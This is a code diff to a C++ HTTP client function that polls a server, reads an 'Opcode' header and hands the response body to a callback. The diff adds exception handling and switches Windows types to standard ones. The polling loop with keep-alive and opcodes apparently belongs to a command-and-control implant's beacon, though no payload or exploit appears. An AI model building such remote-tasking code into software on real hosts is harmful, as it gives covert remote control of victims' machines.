@@ -6,20 +6,26 @@ httplib::Error HttpClient::FetchFromServer() {
         if (auto response = Client.Get(".")) {
         	
             std::string returnedData = "";
-            CHAR resultOpcode = KeepAliveOpcode;            
+            char resultOpcode = KeepAliveOpcode;            
         	
             if (response->status == 200) {
-                DWORD ServerOC = static_cast<DWORD>((*(response->headers.find("Opcode")->second.c_str())) - 48);
+                int ServerOC = static_cast<int>((*(response->headers.find("Opcode")->second.c_str())) - 48);
 
             	if (ServerOC != KeepAliveOpcode) {
 
-                    resultOpcode = static_cast<CHAR>(ClientOpcode::Failure);
+                    resultOpcode = static_cast<char>(ClientOpcode::Failure);
  
                     if (this->CallbackFunction) {
-                        if (this->CallbackFunction(static_cast<ServerOpcode>(ServerOC), (PVOID)response->body.c_str(), response->body.length(), &returnedData))
-                            resultOpcode = static_cast<CHAR>(ClientOpcode::Success);
-                        if (returnedData.length() > 0)
-                            resultOpcode = static_cast<CHAR>(ClientOpcode::SuccessWithReturnedData);
+	                    try {
+                            this->CallbackFunction(static_cast<ServerOpcode>(ServerOC), (PVOID)response->body.c_str(), response->body.length(), &returnedData);
+                            resultOpcode = static_cast<char>(ClientOpcode::Success);
+	                    }
+                        catch (const std::exception& exception) {
+                            returnedData = exception.what();                            
+                        }
+	                    catch (...) {
+                            returnedData = "[-] Unknown exception occurred";                            
+	                    }                        
                     }
             	}                
             }      	
@@ -30,6 +36,7 @@ httplib::Error HttpClient::FetchFromServer() {
     	else return response.error();        
     }
     catch (...) {
-
+    	// TODO: Handle each exception accordingly
+        return httplib::Error::Unknown;
     }
 }
